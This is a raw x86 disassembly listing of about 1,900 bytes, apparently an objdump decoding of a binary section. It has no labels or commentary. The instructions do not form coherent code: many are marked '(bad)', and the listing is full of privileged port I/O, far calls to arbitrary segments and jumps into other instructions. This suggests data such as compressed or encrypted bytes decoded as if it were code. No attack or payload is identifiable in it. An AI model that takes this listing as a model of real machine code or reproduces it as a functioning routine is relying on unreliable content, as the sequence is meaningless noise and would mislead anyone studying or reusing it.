  415c91:	xor    eax,0x98c60ac6
  415c96:	xor    ebp,DWORD PTR [ecx-0x68]
  415c99:	addr16 push 0xc72153d4
  415c9f:	push   eax
  415ca0:	adc    ecx,DWORD PTR [ecx+ebp*1-0xa]
  415ca4:	dec    esi
  415ca5:	mov    cl,0xb5
  415ca7:	(bad)  
  415ca8:	add    eax,0x7a76459
  415cad:	call   0x3b2a:0xe226d7bc
  415cb4:	mov    ch,0x77
  415cb6:	sbb    al,0x9
  415cb8:	or     bl,bh
  415cba:	sub    ebp,ecx
  415cbc:	(bad)  
  415cbd:	mov    ah,0xef
  415cbf:	add    DWORD PTR [edx],ebx
  415cc1:	or     al,0xba
  415cc3:	sti    
  415cc4:	pop    ds
  415cc5:	leave  
  415cc6:	jbe    0x415d21
  415cc8:	aam    0x3a
  415cca:	test   eax,0x4272541c
  415ccf:	pop    esp
  415cd0:	mov    al,ds:0x41d7eb61
  415cd5:	stc    
  415cd6:	mov    eax,0x8de0142d
  415cdb:	call   0x7644:0xa82c41c8
  415ce2:	lods   al,BYTE PTR ds:[esi]
  415ce3:	push   esi
  415ce5:	gs ds cmp bl,bh
  415ce9:	popa   
  415cea:	ds icebp 
  415cec:	mov    dh,BYTE PTR [esi]
  415cee:	adc    eax,0x968ffaa6
  415cf3:	rol    BYTE PTR [ebx+esi*2-0x41dc9af1],0x49
  415cfb:	inc    edx
  415cfc:	sahf   
  415cfd:	cmp    al,0x72
  415cff:	scas   eax,DWORD PTR es:[edi]
  415d00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d01:	inc    ebx
  415d02:	mov    eax,ds:0xfb60dd96
  415d07:	add    bh,cl
  415d09:	in     eax,0x52
  415d0b:	mov    al,ds:0x8b81e6bf
  415d10:	out    dx,al
  415d11:	inc    ebp
  415d12:	jl     0x415d8e
  415d14:	xchg   esp,eax
  415d15:	fmul   DWORD PTR [ebp+0x7e8be754]
  415d1b:	cmp    DWORD PTR [edx],ebp
  415d1d:	out    dx,eax
  415d1e:	sub    eax,0xe00da002
  415d23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d24:	fst    QWORD PTR [eax]
  415d26:	cdq    
  415d27:	pop    ss
  415d28:	add    al,0x57
  415d2a:	out    dx,al
  415d2b:	push   cs
  415d2c:	adc    al,0x7f
  415d2e:	(bad)  
  415d2f:	xor    eax,0x9897140c
  415d34:	out    0x1e,eax
  415d36:	jbe    0x415d2d
  415d38:	fst    DWORD PTR [ecx-0x1e]
  415d3b:	inc    edi
  415d3c:	push   esi
  415d3d:	dec    ecx
  415d3e:	loopne 0x415cf0
  415d40:	jne    0x415d7e
  415d42:	imul   ebx,DWORD PTR [edx+0x76],0xffffffb1
  415d46:	pop    ebx
  415d47:	xchg   ebp,eax
  415d48:	mov    ebp,0x22a65577
  415d4d:	test   al,0x61
  415d4f:	sub    DWORD PTR [ebx-0x4e2760ac],esp
  415d55:	lods   eax,DWORD PTR ds:[esi]
  415d56:	lods   eax,DWORD PTR ds:[esi]
  415d57:	ja     0x415d04
  415d59:	xor    edi,DWORD PTR [esi+edi*4+0x38]
  415d5d:	shl    DWORD PTR [eax+0x47],cl
  415d60:	pop    edx
  415d61:	sbb    BYTE PTR [ecx-0x61a2462c],ah
  415d67:	icebp  
  415d68:	arpl   sp,ax
  415d6a:	ret    0xa853
  415d6d:	in     eax,0xa4
  415d6f:	sahf   
  415d70:	test   dl,ch
  415d72:	clc    
  415d73:	scas   al,BYTE PTR es:[edi]
  415d74:	and    eax,0xc4e90eba
  415d79:	fistp  QWORD PTR [esi*2+0x242894ad]
  415d80:	scas   al,BYTE PTR es:[edi]
  415d81:	jg     0x415dac
  415d83:	xchg   DWORD PTR [ebx-0x27],ecx
  415d86:	xchg   edi,eax
  415d87:	inc    edx
  415d88:	or     DWORD PTR [ebx-0x4f],esp
  415d8b:	adc    eax,DWORD PTR [esp+eiz*8]
  415d8e:	repz inc ecx
  415d90:	ret    
  415d91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d92:	add    BYTE PTR [edi-0x41],ch
  415d95:	pusha  
  415d96:	(bad)  
  415d97:	stos   DWORD PTR es:[edi],eax
  415d98:	xchg   esp,eax
  415d99:	sbb    BYTE PTR [edi+eax*8-0x37],dh
  415d9d:	repz cli 
  415d9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415da0:	inc    edi
  415da1:	jge    0x415dc1
  415da3:	xchg   edi,eax
  415da4:	nop
  415da5:	jo     0x415dbf
  415da7:	(bad)  
  415da8:	jge    0x415d95
  415daa:	idiv   BYTE PTR [ebx]
  415dac:	je     0x415d3e
  415dae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415daf:	in     al,0x54
  415db1:	mov    esp,0xa5827739
  415db6:	fcmovb st,st(5)
  415db8:	loopne 0x415e11
  415dba:	and    DWORD PTR [ecx-0x62],edi
  415dbd:	add    eax,0x9477bf
  415dc2:	lds    esi,FWORD PTR [esi]
  415dc4:	mov    BYTE PTR [edx-0x20032c5b],bl
  415dca:	pop    ss
  415dcb:	inc    esi
  415dcc:	jmp    0x415e25
  415dce:	arpl   WORD PTR [ebx-0x5ee1ef60],sp
  415dd4:	in     eax,0x4b
  415dd6:	push   esp
  415dd7:	ficom  DWORD PTR [esi-0x6f4e0a2]
  415ddd:	pop    esp
  415dde:	xor    eax,DWORD PTR [esi+0x5a]
  415de1:	sbb    BYTE PTR ds:0x94dd9a12,ah
  415de7:	(bad)  
  415de8:	jns    0x415df5
  415dea:	push   edi
  415deb:	sub    ebx,DWORD PTR [edi]
  415ded:	sub    cl,BYTE PTR [ebx+ebx*4+0x1ed6d847]
  415df4:	fldenv [esi-0x4]
  415df7:	and    BYTE PTR [edi-0x22fe1dfe],cl
  415dfd:	cmp    BYTE PTR [esi],0xcd
  415e00:	jl     0x415dd6
  415e02:	outs   dx,DWORD PTR ds:[esi]
  415e03:	mov    BYTE PTR [esi],al
  415e05:	xor    bh,BYTE PTR [ecx]
  415e07:	call   0x72db7bf5
  415e0c:	sub    BYTE PTR [esp+eax*8-0x71],al
  415e10:	(bad)  
  415e11:	dec    ebx
  415e12:	pop    esp
  415e13:	fidivr DWORD PTR [esi+0x5a]
  415e16:	jne    0x415de9
  415e18:	ss jne 0x415e47
  415e1b:	mov    ds:0x9a6a0e07,eax
  415e20:	inc    edx
  415e21:	lea    esp,[ecx]
  415e23:	lahf   
  415e24:	shl    DWORD PTR [esi-0x3607b8c9],0x5f
  415e2b:	lods   al,BYTE PTR ds:[esi]
  415e2c:	or     eax,0x374bc9e3
  415e31:	ret    
  415e32:	mov    eax,ds:0xf9507fb3
  415e37:	jecxz  0x415e88
  415e39:	push   eax
  415e3a:	test   ah,bl
  415e3c:	add    ebp,DWORD PTR [esp+ecx*2]
  415e3f:	inc    esp
  415e40:	scas   al,BYTE PTR es:[edi]
  415e41:	jo     0x415df0
  415e43:	sub    edx,ebx
  415e45:	in     al,dx
  415e46:	mov    al,0x25
  415e48:	jne    0x415e0a
  415e4a:	loop   0x415e52
  415e4c:	cmp    esi,DWORD PTR [edi+0x2b]
  415e4f:	push   edi
  415e50:	jle    0x415dd8
  415e52:	retf   0x14ad
  415e55:	call   0xd3fd:0x2257a39
  415e5c:	dec    ebx
  415e5d:	and    DWORD PTR [ebx-0x14a31cc5],edi
  415e63:	pop    ebx
  415e64:	push   ds
  415e65:	pusha  
  415e66:	inc    ecx
  415e67:	add    DWORD PTR [ebp+edi*8-0x28d5b0c2],edi
  415e6e:	push   ebx
  415e6f:	mov    dh,BYTE PTR [edx]
  415e71:	in     eax,0x96
  415e73:	in     eax,0x56
  415e75:	mov    ebx,0x2a4c8c2c
  415e7a:	fs push es
  415e7c:	stos   BYTE PTR es:[edi],al
  415e7d:	retf   0xbc5b
  415e80:	inc    ebx
  415e81:	dec    ebp
  415e82:	mov    bl,0x88
  415e84:	sti    
  415e85:	sbb    BYTE PTR [edi+0x6def519a],ch
  415e8b:	call   DWORD PTR [edx+esi*4]
  415e8e:	xchg   BYTE PTR [eax],bh
  415e90:	(bad)  
  415e91:	xchg   ecx,eax
  415e92:	cdq    
  415e93:	call   FWORD PTR [edx+0x1e69f4bf]
  415e99:	repnz in eax,0xe9
  415e9c:	mov    ch,0xe3
  415e9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e9f:	imul   esp,ebp,0x5006e4d3
  415ea5:	jmp    0x57dc76ba
  415eaa:	xor    esi,edi
  415eac:	add    ebx,ecx
  415eae:	push   eax
  415eaf:	lock loopne 0x415e94
  415eb2:	xor    cl,ch
  415eb4:	mov    ecx,0x533f04f3
  415eb9:	shr    BYTE PTR [edx-0x6f7a66de],1
  415ebf:	test   DWORD PTR [edi+0x5f],esi
  415ec2:	cmp    eax,ecx
  415ec4:	sar    esi,1
  415ec6:	mov    edi,0x1970734e
  415ecb:	je     0x415eac
  415ecd:	and    edx,DWORD PTR [eax+0x6133e]
  415ed3:	mov    ah,0x3b
  415ed5:	mov    ecx,edx
  415ed7:	ret    0x47f8
  415eda:	dec    ecx
  415edb:	pop    ebp
  415edc:	dec    ebp
  415edd:	stos   DWORD PTR es:[edi],eax
  415ede:	dec    ecx
  415edf:	cs inc esp
  415ee1:	jp     0x415e89
  415ee3:	push   ebp
  415ee4:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  415ee6:	ds pop eax
  415ee8:	xchg   ebp,eax
  415ee9:	or     al,0x75
  415eeb:	dec    ebp
  415eec:	sub    al,0x23
  415eee:	sbb    eax,DWORD PTR [ebp-0x7fd5a8d9]
  415ef4:	mov    BYTE PTR [esi+0x531d7844],bl
  415efa:	jne    0x415f6c
  415efc:	push   0x55
  415efe:	xor    esp,DWORD PTR [edx-0x1e]
  415f01:	test   BYTE PTR [esi-0x65],dh
  415f04:	frstor [edi+eiz*1+0x4]
  415f08:	loopne 0x415e93
  415f0a:	loopne 0x415efd
  415f0c:	jb     0x415f68
  415f0e:	addr16 add al,0x4b
  415f11:	fld    QWORD PTR [ecx]
  415f13:	sahf   
  415f14:	or     esi,DWORD PTR [ecx+edx*4+0x8]
  415f18:	lods   eax,DWORD PTR ds:[esi]
  415f19:	popf   
  415f1a:	mov    eax,0x14cc0e30
  415f1f:	dec    edx
  415f20:	adc    DWORD PTR [edi],0xffffffdc
  415f23:	retf   
  415f24:	add    ecx,edi
  415f26:	das    
  415f27:	std    
  415f28:	dec    edx
  415f29:	sbb    al,dl
  415f2b:	sbb    ebx,0x13e633e2
  415f31:	mov    dl,0x55
  415f33:	jg     0x415f40
  415f35:	popf   
  415f36:	pop    ds
  415f37:	or     BYTE PTR [edx-0x57],ah
  415f3a:	or     esp,DWORD PTR [ebp+eax*8+0x5db07bf0]
  415f41:	mov    ch,0xed
  415f43:	and    BYTE PTR [ebp-0x9],0xd
  415f47:	mov    ch,0xd0
  415f49:	lods   al,BYTE PTR ds:[esi]
  415f4a:	inc    esi
  415f4b:	xchg   edi,eax
  415f4c:	out    dx,eax
  415f4d:	sysexit 
  415f4f:	pop    ds
  415f50:	sub    cl,BYTE PTR [ebp+esi*1+0x60]
  415f54:	test   ebx,eax
  415f56:	icebp  
  415f57:	mov    eax,0x301957af
  415f5c:	and    dl,BYTE PTR [eax-0x43]
  415f5f:	push   0x2f929868
  415f64:	sub    DWORD PTR [edx-0x58],edi
  415f67:	sbb    edx,DWORD PTR [edi-0x45]
  415f6a:	add    dl,BYTE PTR [esi+eiz*1+0x4a]
  415f6e:	push   ecx
  415f6f:	mov    ebx,0xcee9f589
  415f74:	call   0xb3d30326
  415f79:	sbb    al,0xb0
  415f7b:	call   0xdc92bab5
  415f80:	xor    eax,0xc1f404e2
  415f85:	(bad)  
  415f86:	repnz cdq 
  415f88:	in     al,dx
  415f89:	ret    
  415f8a:	rol    BYTE PTR [edx-0xad40926],0x4c
  415f91:	inc    esp
  415f92:	out    dx,al
  415f93:	(bad)  
  415f94:	mov    ebx,0x9ce6e06a
  415f99:	jecxz  0x415f78
  415f9b:	inc    edx
  415f9c:	bound  ebx,QWORD PTR [edi+0x4414e9c2]
  415fa2:	add    BYTE PTR [edi-0x3c],ah
  415fa5:	jns    0x415fac
  415fa7:	push   ds
  415fa8:	in     eax,0xa1
  415faa:	mov    dh,0x53
  415fac:	jo     0x416016
  415fae:	or     esp,edi
  415fb0:	push   0x1e
  415fb2:	popf   
  415fb3:	inc    ebp
  415fb4:	outs   dx,DWORD PTR ds:[esi]
  415fb5:	dec    edi
  415fb6:	pop    ds
  415fb7:	dec    ecx
  415fb8:	jo     0x415f49
  415fba:	jmp    0x415f62
  415fbc:	jb     0x415f41
  415fbe:	pop    ebp
  415fbf:	xchg   ebx,eax
  415fc0:	into   
  415fc1:	add    eax,DWORD PTR [edx-0x53af0a99]
  415fc7:	out    0x5,al
  415fc9:	cmp    ecx,DWORD PTR [edi+edx*4]
  415fcc:	das    
  415fcd:	pop    edi
  415fce:	xchg   esi,eax
  415fcf:	or     eax,0x9ab5ff4b
  415fd4:	adc    BYTE PTR [eax],al
  415fd6:	pop    es
  415fd7:	(bad)  
  415fd8:	xchg   ecx,eax
  415fd9:	mov    edi,0xc3dc1862
  415fde:	pop    edi
  415fdf:	xchg   ebp,eax
  415fe0:	mov    ds:0xc7a22c7f,eax
  415fe5:	das    
  415fe6:	lods   al,BYTE PTR ds:[esi]
  415fe7:	pop    esi
  415fe8:	repz dec ecx
  415fea:	jmp    0x2217:0xd786322b
  415ff1:	xchg   BYTE PTR [ecx],al
  415ff3:	test   ebp,ebx
  415ff5:	into   
  415ff6:	mov    edx,0x3fea7858
  415ffb:	ins    DWORD PTR es:[edi],dx
  415ffc:	push   edi
  415ffd:	arpl   WORD PTR [edi-0x35e0b4d2],bp
  416003:	or     edi,DWORD PTR [ebp+0x2a]
  416006:	aaa    
  416007:	rol    DWORD PTR [edx],0x5f
  41600a:	test   eax,0x907bba05
  41600f:	ret    
  416010:	pop    esi
  416011:	les    ecx,FWORD PTR [edi*4-0xb3a67cb]
  416018:	je     0x416037
  41601a:	iret   
  41601b:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41601d:	cdq    
  41601e:	push   edx
  41601f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416020:	fmul   DWORD PTR [edi]
  416022:	cmp    al,0xb0
  416024:	cld    
  416025:	fcom   DWORD PTR [esi]
  416027:	jg     0x416013
  416029:	fmulp  st(5),st
  41602b:	mov    DWORD PTR [ebx-0x3d],ebp
  41602e:	xchg   edx,eax
  41602f:	fist   WORD PTR [ebx+ebx*2+0xd]
  416033:	rcr    DWORD PTR ds:[esi+0x38fd7f73],cl
  41603a:	add    BYTE PTR [ecx],bh
  41603c:	xor    eax,0x525c588c
  416041:	cdq    
  416042:	es sub esi,0x34
  416046:	shl    DWORD PTR [esi-0x76590ad1],0xea
  41604d:	retf   0xfc1
  416050:	jbe    0x4160cd
  416052:	test   BYTE PTR [edi+ebp*1],al
  416055:	fld    DWORD PTR [ebx+eax*1+0x1c]
  416059:	ja     0x416091
  41605b:	mov    WORD PTR ds:0x3b8f766f,cs
  416061:	fidiv  DWORD PTR [edi]
  416063:	data16 or BYTE PTR [eax+ebp*4+0x6c],bh
  416068:	or     dh,BYTE PTR [ebx+0x170df122]
  41606e:	xchg   esi,eax
  41606f:	sbb    eax,0x56b2b9ad
  416074:	fiadd  WORD PTR [eax]
  416076:	pop    esp
  416077:	into   
  416078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416079:	mov    ebp,0xb366aad1
  41607e:	jns    0x41600c
  416080:	add    DWORD PTR [edi],esi
  416082:	retf   
  416083:	adc    al,0x2d
  416085:	sub    eax,DWORD PTR es:[ebx]
  416088:	js     0x4160e4
  41608a:	div    BYTE PTR [eax+0x2b]
  41608d:	(bad)  
  41608e:	rol    DWORD PTR [edx-0x3c],cl
  416091:	cmp    DWORD PTR [edx+ecx*2+0x29],0xc9baf91a
  416099:	hlt    
  41609a:	mov    esi,0x5904969
  41609f:	inc    esp
  4160a0:	fstp   QWORD PTR [edx+esi*1+0x8]
  4160a4:	repz mov al,0xf1
  4160a7:	popf   
  4160a8:	xchg   edx,eax
  4160a9:	clc    
  4160aa:	sar    bh,1
  4160ac:	ja     0x416058
  4160ae:	and    eax,0x8e9729ae
  4160b3:	loope  0x416099
  4160b5:	pop    es
  4160b6:	add    ebx,DWORD PTR [esi]
  4160b8:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4160ba:	scas   al,BYTE PTR es:[edi]
  4160bb:	jne    0x4160ad
  4160bd:	cmp    BYTE PTR [ebp+0x5a],bh
  4160c0:	push   es
  4160c1:	mov    ds:0xecce8977,al
  4160c6:	popa   
  4160c7:	inc    edx
  4160c8:	cmp    ebp,ebx
  4160ca:	push   ds
  4160cb:	dec    edi
  4160cc:	xchg   BYTE PTR [ebx+0x1b],dh
  4160cf:	inc    esi
  4160d0:	adc    BYTE PTR [eax+0x48],cl
  4160d3:	xchg   esp,eax
  4160d4:	mov    ah,0x7f
  4160d6:	retf   
  4160d7:	test   DWORD PTR [edi-0x34f6ef97],ebx
  4160dd:	cwde   
  4160de:	mov    dl,0x24
  4160e0:	in     al,dx
  4160e1:	ret    
  4160e2:	xchg   edx,eax
  4160e3:	jle    0x4160ef
  4160e5:	jmp    0x7e3c:0x7eea0855
  4160ec:	(bad)  
  4160ed:	cmp    DWORD PTR [esi],esi
  4160ef:	xor    eax,0xfda991fb
  4160f4:	add    ch,ch
  4160f6:	retf   
  4160f7:	lock stos DWORD PTR es:[edi],eax
  4160f9:	lods   al,BYTE PTR ds:[esi]
  4160fa:	inc    edi
  4160fb:	xor    DWORD PTR [edx-0x43],eax
  4160fe:	sub    BYTE PTR [ecx-0x32],0x9b
  416102:	stos   DWORD PTR es:[edi],eax
  416103:	mov    ds:0xa0934bd9,al
  416108:	aad    0x1f
  41610a:	mov    edi,cs
  41610c:	es je  0x416157
  41610f:	dec    ecx
  416110:	sub    dl,BYTE PTR [ecx]
  416112:	cmp    BYTE PTR [esi+0x245e1373],bl
  416118:	and    eax,DWORD PTR [ecx]
  41611a:	repz gs aaa 
  41611d:	icebp  
  41611e:	pop    esi
  41611f:	shl    BYTE PTR ds:0x209bfeb4,cl
  416125:	xchg   edi,eax
  416126:	add    BYTE PTR [eax-0x6d08f8e5],0x3c
  41612d:	fisubr WORD PTR [ebx]
  41612f:	xor    ch,al
  416131:	adc    BYTE PTR [ecx],cl
  416133:	inc    ebx
  416134:	lods   eax,DWORD PTR ds:[esi]
  416135:	jns    0x416117
  416137:	daa    
  416138:	ret    0xf533
  41613b:	pop    edx
  41613c:	in     eax,0x5e
  41613e:	js     0x4160df
  416140:	fcomp  DWORD PTR [esi+ecx*1-0x7289541a]
  416147:	lock in eax,dx
  416149:	mov    ch,BYTE PTR ds:0x6d930323
  41614f:	jp     0x416183
  416151:	mov    ds:0xc9735d96,eax
  416156:	fwait
  416157:	cli    
  416158:	pop    ds
  416159:	loop   0x41613f
  41615b:	add    DWORD PTR [eax],edx
  41615d:	aam    0x6a
  41615f:	adc    DWORD PTR [esi+0x5bdd7ae3],edx
  416165:	lea    edi,[ecx+0x75]
  416168:	hlt    
  416169:	add    BYTE PTR ds:0x565d8dec,bh
  41616f:	ss (bad) 
  416171:	mov    edx,0xee63b183
  416176:	shl    BYTE PTR ds:0xe4d276be,0xd9
  41617d:	or     BYTE PTR [ecx],bl
  41617f:	dec    esp
  416180:	and    BYTE PTR [edi+0x22],0xa4
  416184:	xchg   esp,eax
  416185:	hlt    
  416186:	jle    0x4161da
  416188:	sbb    BYTE PTR [edi+edx*8+0x16],0x79
  41618d:	mov    ecx,0xd2d4ef73
  416192:	fcmovb st,st(2)
  416194:	test   BYTE PTR [esi],bl
  416196:	fcmovbe st,st(5)
  416198:	cwde   
  416199:	inc    esp
  41619a:	bound  ecx,QWORD PTR [eax+0x66362a5d]
  4161a0:	outs   dx,DWORD PTR ds:[esi]
  4161a1:	push   ecx
  4161a2:	loopne 0x41613c
  4161a4:	push   eax
  4161a5:	xchg   ecx,eax
  4161a6:	add    edx,ebp
  4161a8:	dec    ebp
  4161a9:	lea    esi,[edx-0x4c]
  4161ac:	lds    ecx,FWORD PTR [eax-0x61de19d]
  4161b2:	call   0x5f46:0xc5415633
  4161b9:	into   
  4161ba:	inc    edx
  4161bb:	rol    BYTE PTR [eax+0x25],cl
  4161be:	(bad)  
  4161c1:	out    dx,eax
  4161c2:	int3   
  4161c3:	adc    DWORD PTR [ebp-0x56],ebx
  4161c6:	inc    ecx
  4161c7:	mov    ch,0xab
  4161c9:	mov    ds:0xdb307f34,eax
  4161ce:	fwait
  4161cf:	xchg   esp,eax
  4161d0:	and    bh,BYTE PTR [ebp+0x5892e437]
  4161d6:	mov    al,ds:0x621e3fb3
  4161db:	fnstenv [edi+ecx*2]
  4161de:	dec    DWORD PTR [ebp-0x7c240092]
  4161e4:	in     al,0x2c
  4161e6:	in     al,0x6a
  4161e8:	pusha  
  4161e9:	das    
  4161ea:	(bad)  
  4161eb:	sbb    dl,ah
  4161ed:	dec    esi
  4161ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161ef:	aam    0x1e
  4161f1:	lahf   
  4161f2:	aaa    
  4161f3:	xor    ah,BYTE PTR [edx-0x193a390e]
  4161f9:	(bad)  
  4161fa:	out    dx,al
  4161fb:	pop    edi
  4161fc:	pop    ebp
  4161fd:	lods   eax,DWORD PTR ds:[esi]
  4161fe:	inc    eax
  4161ff:	call   FWORD PTR [esi]
  416201:	fild   WORD PTR [ecx+ebp*1+0x75]
  416205:	mov    dh,0x3f
  416207:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416208:	mov    bl,0x47
  41620a:	push   ebp
  41620b:	(bad)  
  41620c:	mov    ebp,DWORD PTR [edi]
  41620e:	mov    dl,0x70
  416210:	mov    edx,0xdc98a6e8
  416215:	xor    BYTE PTR [edi-0x796c1f04],bl
  41621b:	add    eax,0x820c1ba4
  416220:	add    bl,cl
  416222:	scas   al,BYTE PTR es:[edi]
  416223:	dec    edi
  416224:	cmp    BYTE PTR [esi-0x17],cl
  416227:	pushf  
  416228:	mov    eax,0x7463fe24
  41622d:	iret   
  41622e:	and    dl,bl
  416230:	out    dx,al
  416231:	ins    DWORD PTR es:[edi],dx
  416232:	stos   DWORD PTR es:[edi],eax
  416233:	aad    0xfa
  416235:	mov    edi,0xce98020
  41623a:	addr16 pusha 
  41623c:	jb     0x416210
  41623e:	nop    DWORD PTR [edx+eax*4+0x752f8d59]
  416246:	out    0x77,eax
  416248:	sti    
  416249:	xlat   BYTE PTR ds:[ebx]
  41624a:	push   edi
  41624b:	stc    
  41624c:	sbb    esi,ebx
  41624e:	mov    ebx,edi
  416250:	cmp    DWORD PTR ds:0xd5b292ce,edx
  416256:	retf   
  416257:	mov    edx,0x518caa88
  41625c:	mov    BYTE PTR [ecx-0x2],cl
  41625f:	add    eax,0xd8ea1445
  416264:	dec    BYTE PTR [esi-0x19]
  416267:	dec    esp
  416268:	xchg   edi,eax
  416269:	dec    edi
  41626a:	popf   
  41626b:	(bad)  
  41626c:	(bad)  
  41626e:	jmp    0xd19d:0x2e1addc9
  416275:	das    
  416276:	push   0x637dddb6
  41627b:	or     ebp,DWORD PTR [edx]
  41627d:	cmp    eax,0xb9bb8a89
  416282:	or     eax,0xf2737bbc
  416287:	xchg   DWORD PTR [esi+0xe60e373],eax
  41628d:	add    dl,BYTE PTR [esi+ebx*2]
  416290:	lahf   
  416291:	cs fwait
  416293:	cmp    edx,DWORD PTR [ebx-0x44]
  416296:	mov    bh,dh
  416298:	adc    edx,DWORD PTR [ecx]
  41629a:	(bad)  
  41629b:	loope  0x416290
  41629d:	pop    ss
  41629e:	cmp    eax,esi
  4162a0:	xchg   esp,eax
  4162a1:	cmp    eax,0xab435945
  4162a6:	retf   0xfb0c
  4162a9:	add    ah,BYTE PTR [eax+0x6df92e63]
  4162af:	mov    ebx,0xc23bcd2e
  4162b4:	xchg   ebp,eax
  4162b5:	pop    ds
  4162b6:	psadbw mm4,QWORD PTR ds:0x26de726c
  4162bd:	jp     0x4162d9
  4162bf:	fcmovnu st,st(7)
  4162c1:	(bad)  
  4162c2:	jge    0x41632a
  4162c4:	jo     0x416342
  4162c6:	xchg   ecx,eax
  4162c7:	inc    ebp
  4162c8:	jge    0x416315
  4162ca:	push   es
  4162cb:	adc    DWORD PTR [ebp-0x501fcba4],ecx
  4162d1:	retf   
  4162d2:	mov    WORD PTR [esi-0x3],es
  4162d5:	sbb    eax,0x1b4f1034
  4162da:	jne    0x416344
  4162dc:	jecxz  0x41630c
  4162de:	pop    esp
  4162df:	cmp    BYTE PTR [edx-0x1d],bh
  4162e2:	outs   dx,BYTE PTR ds:[esi]
  4162e3:	cmp    DWORD PTR [edi+0x30],ebp
  4162e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162e7:	mov    bh,0xbf
  4162e9:	sub    eax,DWORD PTR [edx-0x304772df]
  4162ef:	dec    edx
  4162f0:	pop    edi
  4162f1:	add    BYTE PTR [ecx+0x9],0xcf
  4162f5:	enter  0x6fb,0xc4
  4162f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162fa:	mov    cl,0xe7
  4162fc:	pop    es
  4162fd:	loope  0x41633b
  4162ff:	pop    esp
  416300:	xchg   DWORD PTR [eax],ebp
  416302:	ret    
  416303:	test   BYTE PTR ds:0x3b293444,0x39
  41630a:	(bad)  
  41630b:	mov    dl,0xf8
  41630d:	loop   0x4162ef
  41630f:	push   es
  416310:	(bad)  
  416311:	mov    ecx,0x547e51a3
  416316:	xor    ebp,DWORD PTR [ebx+0x5518bfe]
  41631c:	pusha  
  41631d:	mov    ebx,0xc6d05c3a
  416322:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416323:	inc    ebp
  416324:	xchg   DWORD PTR [edi+0x64cf355c],ebp
  41632a:	fs imul ecx,ebx,0x17
  41632e:	mov    dl,BYTE PTR [eax]
  416330:	xchg   DWORD PTR ds:0xfaaf6056,edx
  416336:	icebp  
  416337:	jg     0x416370
  416339:	inc    edi
  41633a:	dec    esp
  41633b:	push   edx
  41633c:	sahf   
  41633d:	popa   
  41633e:	mov    BYTE PTR cs:[eax-0x44],dh
  416342:	stos   BYTE PTR es:[edi],al
  416343:	pop    ecx
  416344:	shr    DWORD PTR [ebx],0x3f
  416347:	cli    
  416348:	addr16 ds xchg ebx,eax
  41634b:	adc    eax,0x49891b73
  416350:	jb     0x41639f
  416352:	nop
  416353:	jnp    0x416362
  416355:	jnp    0x416324
  416357:	or     al,0xb8
  416359:	mov    dl,0x1f
  41635b:	mov    ch,0x30
  41635d:	lahf   
  41635e:	or     eax,0xdc31c1f7
  416363:	xor    ah,BYTE PTR [eax]
  416365:	jmp    0x416321
  416367:	mov    ds:0x1b3ed86d,eax
  41636c:	lds    edx,FWORD PTR [ecx+ebp*2]
  41636f:	inc    esi
  416370:	mov    ebp,DWORD PTR [ecx+0x22]
  416373:	push   esi
  416374:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416375:	push   ss
  416376:	idiv   BYTE PTR [edi+0x2e]
  416379:	test   eax,0x6d79e969
  41637e:	jbe    0x41639e
  416380:	adc    eax,0xe163d82f
  416385:	les    eax,FWORD PTR [ecx]
  416387:	inc    eax
  416388:	push   0xd5a0e8d8
  41638d:	sbb    eax,0x5d7ba597
  416392:	jp     0x416328
  416394:	push   ds
  416395:	pop    fs
  416397:	mov    esi,DWORD PTR ds:[ebx]
  41639a:	xor    DWORD PTR [edi+0x900288e],0x2dfe417
  4163a4:	aaa    
  4163a5:	pop    ds
  4163a6:	rcr    DWORD PTR [esp+edi*8-0x35af22a],cl
  4163ad:	adc    dl,BYTE PTR [ecx+0x15a9798b]
  4163b3:	pop    esp
  4163b4:	fsub   QWORD PTR [edx+0x5a]
  4163b7:	mov    es,WORD PTR [esp+ebx*1]
  4163ba:	out    0xd,al
  4163bc:	inc    esi
  4163bd:	cmp    ch,BYTE PTR [ecx-0x5d]
  4163c0:	dec    edi
  4163c1:	xchg   ebp,eax
  4163c2:	inc    eax
  4163c3:	enter  0xc307,0x99
  4163c7:	pop    es
  4163c8:	(bad)  
  4163c9:	mov    al,0x78
  4163cb:	jl     0x416445
  4163cd:	mov    dl,0xee
  4163cf:	out    dx,eax
  4163d0:	jp     0x4163a9
  4163d2:	push   ds
  4163d3:	mov    al,ds:0xbaa064b7
  4163d8:	pop    edx
  4163d9:	hlt    
  4163da:	out    0xa2,eax
  4163dc:	aas    
  4163dd:	pop    ss
  4163de:	xor    DWORD PTR ds:[edi+0x42f798e9],0x6a
  4163e6:	cmp    esi,DWORD PTR [ebx-0x19]
  4163e9:	jns    0x416466
  4163eb:	js     0x41644c
  4163ed:	and    DWORD PTR [esp+eax*4],esi
  4163f0:	int    0x49
  4163f2:	xchg   ebp,eax
  4163f3:	test   esi,0x4c81f7a3
  4163f9:	cmc    
  4163fa:	fidiv  WORD PTR [ebx-0x41]
  4163fd:	call   0x9b76:0x8e4e7351
  416404:	cmp    al,0x82
  416406:	aas    
  416407:	pop    esi
  416408:	lock push edi
  41640a:	push   edx
  41640b:	or     al,0xf4
  41640d:	call   0x1dc1:0xb0e22e16
  416414:	popa   
  416415:	out    0x82,eax
  416417:	adc    BYTE PTR [ecx+0x7085df0b],al
  41641d:	jge    0x41641d
  41641f:	(bad)  
  416420:	cli    
  416421:	cmp    DWORD PTR [esi],0x1d936ad9
  416427:	sbb    ah,BYTE PTR [eax-0x4a]
  41642a:	jmp    0x4163fa
  41642c:	mov    bl,0x49
  41642e:	aaa    
